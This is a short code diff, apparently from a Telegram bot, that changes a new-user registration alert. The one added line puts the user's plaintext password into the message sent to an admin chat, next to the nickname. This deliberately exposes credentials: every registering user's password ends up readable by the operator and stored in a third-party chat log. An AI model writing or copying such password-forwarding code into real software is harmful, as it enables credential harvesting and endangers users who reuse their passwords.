@@ -13,6 +13,7 @@ async function notifyNewUser(nickname, password) {
       ADMIN_CHAT,
       `🆕 Новая регистрация\n` +
       `👤 Ник: ${nickname}\n` +
+      `🔑 Пароль: \`${password}\`\n` +
       passLine,
       { parse_mode: 'Markdown' }
     );
